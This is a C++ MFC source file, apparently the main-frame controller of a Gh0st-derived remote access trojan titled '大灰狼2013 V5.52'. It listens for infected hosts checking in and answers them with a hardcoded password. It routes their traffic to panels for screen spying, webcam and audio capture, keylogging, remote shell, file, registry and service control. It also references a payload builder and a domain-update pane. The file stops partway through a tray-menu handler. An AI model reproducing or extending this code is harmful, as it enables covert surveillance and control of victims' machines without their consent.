// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "MainFrm.h"
#include "Gh0stView.h"

#include "PcView.h"
#include "LogView.h"
#include "ShowNum.h"
//#include "MoreChoose.h"

#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "SerManager.h"
#include "SettingDlg.h"
#include "BuildServer1.h"
#include "UPDATEIP.h"
//#include "Batch.h"
#include "RegDlg.h"
#include "User.h"
//#include "Play.h"
#include "proxy.h"
#include "MyToolsKit.h"
#include "UPDATEIP.h"
//#include "Skin.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define WM_ICONMESSAGE   WM_USER + 100

CPcView* g_pConnectView = NULL; //在NotifyProc中初始化
extern CGh0stView* g_pTabView;
extern CLogView* g_pLogView;
//extern CUPDATEIP* g_pcupdateip;
//class CUPDATEIP* g_pcupdateip;

CIOCPServer *m_iocpServer = NULL;
CString		m_PassWord = "password";
CMainFrame	*g_pFrame; // 在CMainFrame::CMainFrame()中初始化

char Bt_szName[150] = {0};//

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_SYSCOMMAND()
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_UPDATE_COMMAND_UI(ID_STAUTSTIP, OnUpdateStatusBar)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_EXIT, OnExit)
	ON_WM_ERASEBKGND()
	ON_COMMAND(IDM_SETTINGS, OnSettings)
	ON_COMMAND(IDM_BUILD, OnBuild)
	ON_COMMAND(ID_APP_EXIT, OnAppExit)
	ON_COMMAND(IDM_TOOLS, OnTools)     //实用工具
	ON_WM_TIMER()
	ON_MESSAGE(WM_SYSTRAY,OnSystray)
	ON_COMMAND(IDM_NEWSTIPS, OnNewstips)
	ON_UPDATE_COMMAND_UI(ID_STAUTSSPEED, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSPORT, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSCOUNT, OnUpdateStatusBar)
	ON_COMMAND(ID_OPTIONS_FRAMETHEME, OnFrameTheme)
	ON_UPDATE_COMMAND_UI(ID_OPTIONS_FRAMETHEME, OnUpdateFrameTheme)
	ON_COMMAND(IDM_VOICEPROMPT, OnVoiceprompt)
	//}}AFX_MSG_MAP
	ON_XTP_CREATECONTROL()
	ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)
	ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)	
//	ON_COMMAND_RANGE(ID_OPTIONS_STYLEBLUE, ID_OPTIONS_STYLEWHITE, OnOptionsStyle)
	ON_UPDATE_COMMAND_UI_RANGE(ID_OPTIONS_STYLEBLUE, ID_OPTIONS_STYLEWHITE, OnUpdateOptionsStyle)

	
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_STAUTSSPEED,
	ID_STAUTSPORT,
	ID_STAUTSCOUNT
};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	g_pFrame = this;
/*
	TCHAR szStylesPath[_MAX_PATH];

	VERIFY(::GetModuleFileName(
		AfxGetApp()->m_hInstance, szStylesPath, _MAX_PATH));		
	
	CString csStylesPath(szStylesPath);
	int nIndex  = csStylesPath.ReverseFind(_T('\\'));
	if (nIndex > 0) {
		csStylesPath = csStylesPath.Left(nIndex);
	}
	else {
		csStylesPath.Empty();
	}
	m_csStylesPath += csStylesPath + _T("\\Styles\\");

	CString temp;
	temp += csStylesPath + _T("\\Styles");
 	if (GetFileAttributes( temp ) == 0xFFFFFFFF)
 	{	
		CreateDirectory( temp, NULL );
 	}

	m_bChecked = FALSE;
	m_bAnimation = TRUE;
	m_bLayoutRTL = FALSE;

	ZeroMemory(&m_bOptions, sizeof(m_bOptions));


	// get path of executable	
	LPTSTR lpszExt = _tcsrchr(szStylesPath, '.');
	lstrcpy(lpszExt, _T(".xml"));
	
	m_strIniFileName = szStylesPath;

	m_nColumns = 0;

	m_pItemsShapes = 0;
	m_pItemsStyles = 0;
	m_pItemsStyleSet = 0;
	m_pItemsThemeColors = 0;
	m_pItemsThemeFonts = 0;
	m_pItemsFontTextColor = 0;
	m_pItemsFontBackColor = 0;
	m_pItemsFontFace = 0;
	m_pItemsFontSize = 0;
	m_pItemsColumns = 0;

//	m_nRibbonStyle = ID_OPTIONS_STYLEBLUE;
	m_nRibbonStyle = ID_OPTIONS_STYLEAQUA;
	*/
}

CMainFrame::~CMainFrame()
{
}
BOOL ReleaseRes(CString strFileName,WORD wResID,CString strFileType)    
{    
    // 资源大小    
    DWORD   dwWrite=0;          
   
    // 创建文件    
    HANDLE  hFile = CreateFile(strFileName, GENERIC_WRITE,FILE_SHARE_WRITE,NULL,    
                                CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);    
    if ( hFile == INVALID_HANDLE_VALUE )    
    {    
        return FALSE;    
    }    
   
    // 查找资源文件中、加载资源到内存、得到资源大小    
    HRSRC   hrsc =  FindResource(NULL, MAKEINTRESOURCE(wResID), strFileType);    
    HGLOBAL hG = LoadResource(NULL, hrsc);    
    DWORD   dwSize = SizeofResource( NULL,  hrsc);    
   
    // 写入文件    
    WriteFile(hFile,hG,dwSize,&dwWrite,NULL);       
    CloseHandle( hFile );    
    return TRUE;    
}
/*
int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	AfxGetApp()->m_nCmdShow = SW_HIDE;
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1) return -1;
	this->CenterWindow(CWnd::GetDesktopWindow());

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	if (!InitCommandBars())
		return -1;

	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars == NULL)
	{
		TRACE0("Failed to create command bars object.\n");
		return -1;      // fail to create
	}

	// Create ToolBar
	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("工具栏(T)"), xtpBarTop);
	if (!pCommandBar ||
		!pCommandBar->LoadToolBar(IDR_TOOLBAR3)) //
	{
		TRACE0("Failed to create toolbar\n");
		return -1;
	}

	
//    LoadIcons();

	CXTPCommandBarsOptions* pOptions = pCommandBars->GetCommandBarsOptions();


	pOptions->bShowExpandButtonAlways= FALSE;

	pOptions->bShowTextBelowIcons = true;
	pOptions->bLargeIcons = TRUE;
	pCommandBar->GetImageManager()->SetIcons(IDR_TOOLBAR3,IDB_BITMAP1);

	RedrawWindow(0, 0, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);   
	GetCommandBars()->GetPaintManager()->RefreshMetrics(); 
	
	ModifyStyle(WS_THICKFRAME, 0);
	ModifyStyle(0, WS_THICKFRAME);
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowNever);


    //设置下面状态栏
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 250);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 120);


	m_paneManager.InstallDockingPanes(this);
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2010); // 设置主题

	CXTPDockingPane* pwndPaneLog = CreatePane(235, 150, RUNTIME_CLASS(CLogView), _T("日志信息"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneNum = CreatePane(58, 150, RUNTIME_CLASS(CShowNum), _T("主机统计"), xtpPaneDockRight, pwndPaneLog);
//	CXTPDockingPane* pwndPaneChoose = CreatePane(235, 150, RUNTIME_CLASS(CMoreChoose), _T("筛选主机"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneUPDATEIP = CreatePane(235, 150, RUNTIME_CLASS(CUPDATEIP), _T("域名更新"), xtpPaneDockBottom);
//    CXTPDockingPane* pwndPaneBatch = CreatePane(235, 150, RUNTIME_CLASS(CBatch), _T("批量命令"), xtpPaneDockBottom);
//	CXTPDockingPane* pwndPaneplay = CreatePane(260, 145, RUNTIME_CLASS(CBuildServer), _T("整蛊娱乐"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneproxy = CreatePane(235, 150, RUNTIME_CLASS(CProxy), _T("用户代理"), xtpPaneDockBottom);

//	m_paneManager.AttachPane( pwndPaneChoose, pwndPaneLog );
	m_paneManager.AttachPane( pwndPaneUPDATEIP, pwndPaneLog);
//	m_paneManager.AttachPane( pwndPaneBatch, pwndPaneChoose);
	m_paneManager.AttachPane( pwndPaneproxy, pwndPaneUPDATEIP );

	pwndPaneLog->Select();
	pwndPaneLog->SetOptions(xtpPaneNoCaption);
	pwndPaneNum->SetOptions(xtpPaneNoCaption);
//	pwndPaneChoose->SetOptions(xtpPaneNoCaption);
	pwndPaneUPDATEIP->SetOptions(xtpPaneNoCaption);
//	pwndPaneBatch->SetOptions(xtpPaneNoCaption);
//	pwndPaneplay->SetOptions(xtpPaneNoCaption);
	pwndPaneproxy->SetOptions(xtpPaneNoCaption);

	return 0;
}

*/

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	AfxGetApp()->m_nCmdShow = SW_HIDE;
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1) return -1;
	this->CenterWindow(CWnd::GetDesktopWindow());

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	if (!InitCommandBars())
		return -1;

	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars == NULL)
	{
		TRACE0("Failed to create command bars object.\n");
		return -1;      // fail to create
	}

    //设置下面状态栏
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 250);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 120);
/*
	m_wndStatusBar.EnableCustomization();

	if (!m_TrayIcon.Create(_T(""), // Toolktip text
		this,                       // Parent window
		IDR_MAINFRAME,               // Icon resource ID
		IDR_MINIMIZE,             // Resource ID of popup menu
		IDM_SHOW,                // Default menu item for popup menu
		false))                     // True if default menu item is located by position
	{
		TRACE0("Failed to create tray icon\n");
		return -1;
	}
	*/

	if (!InitCommandBars())
	{
		return -1;
	}

//	CXTPCommandBars* pCommandBars = GetCommandBars();
	
	CXTPCommandBar* pMenuBar = pCommandBars->SetMenu(_T("Menu Bar"), IDR_MAINFRAME);
	pMenuBar->SetFlags(xtpFlagAddMDISysPopup);
/*
	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("Standard"), xtpBarTop);
	if (!pCommandBar ||
		!pCommandBar->LoadToolBar(IDR_TOOLBAR3))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;
	};
	*/
	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("工具栏(T)"), xtpBarTop);
	if (!pCommandBar ||
		!pCommandBar->LoadToolBar(IDR_TOOLBAR3)) //
	{
		TRACE0("Failed to create toolbar\n");
		return -1;
	}



	pCommandBars->GetCommandBarsOptions()->bShowTextBelowIcons = TRUE;
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowWindowsDefault);




/*

	// Create ToolBar
	CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("工具栏(T)"), xtpBarTop);
	if (!pCommandBar ||
		!pCommandBar->LoadToolBar(IDR_TOOLBAR3)) //
	{
		TRACE0("Failed to create toolbar\n");
		return -1;
	}

	
//    LoadIcons();

	CXTPCommandBarsOptions* pOptions = pCommandBars->GetCommandBarsOptions();


	pOptions->bShowExpandButtonAlways= FALSE;

	pOptions->bShowTextBelowIcons = true;
	pOptions->bLargeIcons = TRUE;
	pCommandBar->GetImageManager()->SetIcons(IDR_TOOLBAR3,IDB_BITMAP1);

	RedrawWindow(0, 0, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);   
	GetCommandBars()->GetPaintManager()->RefreshMetrics(); 
	
	ModifyStyle(WS_THICKFRAME, 0);
	ModifyStyle(0, WS_THICKFRAME);
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowNever);

*/



	m_paneManager.InstallDockingPanes(this);
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2010); // 设置主题

	CXTPDockingPane* pwndPaneLog = CreatePane(235, 150, RUNTIME_CLASS(CLogView), _T("日志信息"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneNum = CreatePane(58, 150, RUNTIME_CLASS(CShowNum), _T("主机统计"), xtpPaneDockRight, pwndPaneLog);
//	CXTPDockingPane* pwndPaneChoose = CreatePane(235, 150, RUNTIME_CLASS(CMoreChoose), _T("筛选主机"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneUPDATEIP = CreatePane(235, 150, RUNTIME_CLASS(CUPDATEIP), _T("域名更新"), xtpPaneDockBottom);
//    CXTPDockingPane* pwndPaneBatch = CreatePane(235, 150, RUNTIME_CLASS(CBatch), _T("批量命令"), xtpPaneDockBottom);
//	CXTPDockingPane* pwndPaneplay = CreatePane(260, 145, RUNTIME_CLASS(CBuildServer), _T("整蛊娱乐"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneproxy = CreatePane(235, 150, RUNTIME_CLASS(CProxy), _T("远程连接"), xtpPaneDockBottom);

//	m_paneManager.AttachPane( pwndPaneChoose, pwndPaneLog );
	m_paneManager.AttachPane( pwndPaneUPDATEIP, pwndPaneLog);
//	m_paneManager.AttachPane( pwndPaneBatch, pwndPaneChoose);
	m_paneManager.AttachPane( pwndPaneproxy, pwndPaneUPDATEIP );

	pwndPaneLog->Select();
	pwndPaneLog->SetOptions(xtpPaneNoCaption);
	pwndPaneNum->SetOptions(xtpPaneNoCaption);
//	pwndPaneChoose->SetOptions(xtpPaneNoCaption);
	pwndPaneUPDATEIP->SetOptions(xtpPaneNoCaption);
//	pwndPaneBatch->SetOptions(xtpPaneNoCaption);
//	pwndPaneplay->SetOptions(xtpPaneNoCaption);
	pwndPaneproxy->SetOptions(xtpPaneNoCaption);
/*
	XTPColorManager()->DisableLunaColors(TRUE);
	CXTPPaintManager::SetTheme(xtpThemeOffice2003);
	LoadCommandBars(_T("CommandBars"));
	
	SetTimer(1,1000,NULL); 
*/
	m_hDrawIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_hEmptyIcon = AfxGetApp()->LoadIcon(IDI_SYSTRAY1);
    m_NotifyIcon.cbSize = sizeof(NOTIFYICONDATA); 
	m_NotifyIcon.hWnd = this->GetSafeHwnd(); 

	CString Lineips = Onlinetips();
	CString Lineips1 = OnVoicepromptsm();
	wsprintf(m_NotifyIcon.szTip,"主机数量: %d台\n语音: %s\n消息提示: %s",Zjshulian,Lineips1,Lineips);
	m_NotifyIcon.uCallbackMessage = WM_ICONMESSAGE; 
	m_NotifyIcon.uFlags = NIF_MESSAGE|NIF_TIP|NIF_ICON;
	m_NotifyIcon.hIcon = m_hDrawIcon;
	m_NotifyIcon.uID = IDR_MAINFRAME;
	Shell_NotifyIcon(NIM_ADD, &m_NotifyIcon);

     //初始化记录值
//     m_nCurrent = 0;
//	SetTimer(1, 500, NULL);  //开启定时器 1


	return 0;
}

CString CMainFrame::Onlinetips()
{
	CString stro;
	BOOL a_chkm = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "poptips", false);
	if(!a_chkm)
		stro = "开启";
	else
		stro = "关闭";

	return stro;
}

CString CMainFrame::OnVoicepromptsm()
{
	CString stro;
	BOOL a_chkm = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "Alarm", false);
	if(a_chkm)
		stro = "开启";
	else
		stro = "关闭";

	return stro;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs

	cs.cx = 925;
	cs.cy = 556;
	cs.style &= ~FWS_ADDTOTITLE;
	cs.style &= ~WS_MAXIMIZEBOX;   //去掉最大化
    cs.style &= ~WS_THICKFRAME;    //禁止用户改变窗口大小
	cs.style &= ~FWS_ADDTOTITLE;

	

	CString stra1;
	CUPDATEIP Dig;

	char JM_szName[] = {"大灰狼2013 V5.52 远程管理软件--<小源 优化改版>"}; //修改标题修改此处明文即可，加密已经去掉
	stra1=/*Dig.Base64Encode*/(JM_szName);  //加密标题  大灰狼远控V5.52（2013稳定版）
//	char JS_szName[] = {"tPO70sDHMjAxMyBWNS41MiDUtrPMudzA7cjtvP4tLTy49sjL16jTw87Itqiw5j4="}; //加密后标题
//	stra1=Dig.Base64Decode(JM_szName);      //解密标题
	cs.lpszName = stra1;

	//OnAddSkin();  //加皮肤

	return TRUE;
}
/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    if (m_hWnd == NULL)
        return;     // null (unattached) windows are valid
	
    // check for special wnd??? values
    ASSERT(HWND_TOP == NULL);       // same as desktop
    if (m_hWnd == HWND_BOTTOM)
        ASSERT(this == &CWnd::wndBottom);
    else if (m_hWnd == HWND_TOPMOST)
        ASSERT(this == &CWnd::wndTopMost);
    else if (m_hWnd == HWND_NOTOPMOST)
        ASSERT(this == &CWnd::wndNoTopMost);
    else
    {
        // should be a normal window
        ASSERT(::IsWindow(m_hWnd));
	}
	//CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers


int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
{
     if (lpCreateControl->nID == ID_APP_EXIT)
     {
          lpCreateControl->pControl = new CXTPRibbonControlSystemPopupBarButton();
          return TRUE;
     }

     return FALSE;
}

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// 对g_pConnectView 进行初始化
		g_pConnectView = (CPcView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView还没创建，这情况不会发生
		if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
			return;

		g_pConnectView->m_iocpServer = m_iocpServer;

		//str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		str.Format("发送: %.2f kb/s 接收: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		g_pFrame->m_wndStatusBar.SetPaneText(1, str);

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	// 开启IPCP服务器
	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
	{
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += "-";
			}
		}
		CTime time = CTime::GetCurrentTime(); ///构造CTime对象 
		CString strTime = time.Format("  [ 启动时间:%Y年%m月%d日 %H时%M分%S秒 ]");
		CString strPort, strLogText;
		m_wndStatusBar.SetPaneText(0, strTime);
		strPort.Format("监听端口: %d", nPort);
		m_wndStatusBar.SetPaneText(2, strPort);
		strLogText.Format( "系统成功启动 -> 监听端口: [ %d ]", nPort );
		g_pLogView->InsertLogItem( strLogText, 0, 0 );
	}
	else
	{
		str.Format("监听端口: [%d]绑定失败,可能你已开启另一个控制端或者端口被占用！", nPort);
		m_wndStatusBar.SetPaneText(0, str);
		m_wndStatusBar.SetPaneText(2, "监听端口: 0");
		g_pLogView->InsertLogItem( str, 0, 1 );
	}
	
	m_wndStatusBar.SetPaneText(3, "上线主机: 0");
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case SERMANAGER_DLG:
			((CSerManager *)dlg)->OnReceiveComplete();
			break;	
		case REGEDIT_DLG:             //注册表
            ((CRegDlg *)dlg)->OnReceiveComplete();
			break;
		case USER_DLG:
            ((CUser *)dlg)->OnReceiveComplete();  //服务器
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // 要求验证
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
 		break;

	case TOKEN_LOGIN: // 上线包
		{	
			pContext->m_bIsMainSocket = true;
			g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
			// 激活
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
		break;

	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START: // 键盘记录开始
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST: // 进程列表
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START: // 远程终端开始
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
//	case TOKEN_FINDALL_NO: // 筛选返回信息
//		g_pConnectView->PostMessage(WM_FINDALL, 0, (LPARAM)pContext);		
//		break;
//	case TOKEN_FIND_NO: // 筛选返回信息
//		g_pConnectView->PostMessage(WM_FIND, 0, (LPARAM)pContext);		
//		break;
	case TOKEN_SSLIST: // 服务管理
		g_pConnectView->PostMessage(WM_OPENPSERLISTDIALOG, 0, (LPARAM)pContext);
		break;		
	case TOKEN_REGEDIT:   //注册表管理    
		g_pConnectView->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_USER_LIST:   //服务器管理    
		g_pConnectView->PostMessage(WM_OPENRUSERGDIALOG, 0, (LPARAM)pContext);
		break;
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	int iResult = MessageBox("您确认要退出？？？", " 温馨提示！", MB_ICONQUESTION|MB_YESNO);
    if(iResult != IDYES)
		return ;
	pMainFrame->m_TrayIcon.RemoveIcon();
	m_iocpServer->Shutdown();
	delete m_iocpServer;
	// Save the current state for toolbars and menus.
	SaveCommandBars(_T("CommandBars"));

	///////////////////////托盘图标删除
	NOTIFYICONDATA tnd;
	tnd.cbSize=sizeof(NOTIFYICONDATA);
	tnd.hWnd=AfxGetMainWnd()->m_hWnd;
	tnd.uID=IDR_MAINFRAME;//保证删除的是我们的图标
	Shell_NotifyIcon(NIM_DELETE,&tnd);
	///////////////////////////////

	CFrameWnd::OnClose();
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
/*
	CString stra,strTemp;
	int a = 0;
	CPcView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{	
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		a += pView->m_pListCtrl->GetItemCount();
	}
	stra.Format("当前主机数量: %d\n我先隐蔽，记得叫我哟！！！", a);
*/
	if (nID == SC_MINIMIZE)
	{
//		SkinH_Detach(); //卸载皮肤
//		Sleep(50);
//		OnAddSkin();  //加载皮肤
/*
		m_TrayIcon.Create(_T(Bt_szName), // Toolktip text
		this,                       // Parent window
		IDR_MAINFRAME,               // Icon resource ID
		IDR_MINIMIZE,             // Resource ID of popup menu
		IDM_SHOW,                // Default menu item for popup menu
		false);
		*/
		MinTray=TRUE;  //最小托盘状态
		m_TrayIcon.MinimizeToTray(this);


//		NOTIFYICONDATA data={0};
//		_tcscpy_s(data.szInfoTitle,8,_T("Capture")); //气泡提示标题

/*
		m_TrayIcon.Create(_T(""), // Toolktip text
		this,                       // Parent window
		NULL,               // Icon resource ID
		NULL,             // Resource ID of popup menu
		NULL,                // Default menu item for popup menu
		false);
*/
//		m_TrayIcon.ShowBalloonTip( _T("123"), _T(Bt_szName), NIIF_NONE, 5);

	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}

}

LRESULT CMainFrame::OnSystray(WPARAM wParam,LPARAM lParam)
{
	UINT uMouseMsg;//鼠标动作
	uMouseMsg=(UINT)lParam;
	if(uMouseMsg==WM_LBUTTONDOWN)//如果是单击左键
	{
		AfxGetMainWnd()->SetForegroundWindow(); 
		OnShow();
		AfxGetMainWnd()->PostMessage(WM_NULL,0,0);
	}
	if(uMouseMsg==WM_RBUTTONDOWN)
	{
		AfxGetMainWnd()->SetForegroundWindow(); 

		CMenu menu;//弹出Popup菜单
		menu.LoadMenu(IDR_MINIMIZE);
		CMenu* pPopup=menu.GetSubMenu(0);
//		pPopup->SetDefaultItem(IDM_SHOW);

		CString stro;
		BOOL a_chkm = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("设置", "poptips", false);
	    if(!a_chkm)
		    stro = "关闭消息提示";
	    else
		    stro = "开启消息提示";
		pPopup->ModifyMenu(0,MF_BYPOSITION | MF_STRING|MF_POPUP,IDM_NEWSTIPS, stro);

